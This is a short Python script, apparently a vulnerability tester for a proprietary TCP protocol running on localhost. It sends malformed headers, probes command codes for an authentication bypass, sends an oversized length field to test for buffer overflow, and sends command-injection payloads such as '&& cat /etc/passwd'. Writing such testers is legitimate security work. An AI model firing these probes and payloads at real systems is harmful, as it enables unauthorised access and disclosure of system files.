#!/usr/bin/env python3
from scapy.all import *
import struct
import socket
from colorama import Fore, Style, init

init()

class ProtocolTester:
    """Test suite for proprietary protocol vulnerability assessment."""

    def __init__(self, target_ip='127.0.0.1', target_port=8888):
        self.target_ip = target_ip
        self.target_port = target_port
        self.results = []

    def craft_packet(self, magic=0xDEAD, version=1, command=1, payload=b"test"):
        length = len(payload)
        header = struct.pack('!HHHH', magic, version, command, length)
        return header + payload

    def send_packet(self, packet):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.target_port))
            s.sendall(packet)
            response = s.recv(4096)
            s.close()
            return response
        except Exception:
            return None

    def test_valid_commands(self):
        print(Fore.CYAN + "[*] Testing valid commands")

        packet = self.craft_packet(command=1, payload=b"Hello")
        response = self.send_packet(packet)
        print("Echo Response:", response)

        packet = self.craft_packet(command=2, payload=b"")
        response = self.send_packet(packet)
        print("Status Response:", response)

        packet = self.craft_packet(command=3, payload=b"Test")
        response = self.send_packet(packet)
        print("Invalid Command Response:", response)

    def test_invalid_magic(self):
        print(Fore.YELLOW + "[*] Testing invalid magic numbers")

        for magic in [0x0000, 0xFFFF, 0x1234]:
            packet = self.craft_packet(magic=magic)
            response = self.send_packet(packet)
            print(f"Magic {hex(magic)} Response:", response)

    def test_authentication_bypass(self):
        print(Fore.RED + "[*] Testing authentication bypass")
        for cmd in range(990, 1001):
            packet = self.craft_packet(command=cmd)
            response = self.send_packet(packet)
            if response and b"ADMIN" in response:
                print(f"[!] Sensitive data leaked via command {cmd}: {response}")

    def test_buffer_overflow(self):
        print(Fore.RED + "[*] Testing buffer overflow")
        fake_length_packet = struct.pack('!HHHH', 0xDEAD, 1, 1, 2000) + b"A" * 100
        response = self.send_packet(fake_length_packet)
        print("Overflow Response:", response)

    def test_command_injection(self):
        print(Fore.RED + "[*] Testing command injection")
        payloads = [b"; ls -la", b"| whoami", b"&& cat /etc/passwd"]

        for payload in payloads:
            packet = self.craft_packet(command=1, payload=payload)
            response = self.send_packet(packet)
            print(f"Payload {payload} Response:", response)

if __name__ == "__main__":
    tester = ProtocolTester()
    tester.test_valid_commands()
    tester.test_invalid_magic()
    tester.test_authentication_bypass()
    tester.test_buffer_overflow()
    tester.test_command_injection()
